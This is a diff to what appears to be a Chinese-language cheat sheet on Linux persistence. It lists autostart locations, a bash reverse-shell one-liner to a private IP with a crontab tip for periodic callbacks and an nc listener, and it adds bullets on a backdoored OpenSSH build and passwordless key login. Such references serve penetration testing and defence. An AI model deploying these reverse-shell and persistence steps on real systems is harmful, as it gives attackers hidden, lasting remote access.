@@ -20,6 +20,7 @@
 ----------------------------------------
 - /etc/init.d
 - /etc/rc.d/rc.local
+- /lib/systemd/system
 - ~/.bashrc
 - ~/.zshrc
 
@@ -31,8 +32,10 @@
 
 - 反弹Shell
     - ``bash -i >& /dev/tcp/192.168.28.131/12345  0>&1``
-        - 可用于添加``crontab -e`` 周期性反弹
+        - 可用于添加 ``crontab -e`` 周期性反弹
         - ``nc -lvp 12345`` 监听
+- 重编译 openssh 后门
+- ssh 公私钥免密登录
 - 常见应用
     - ICMP
     - DNS
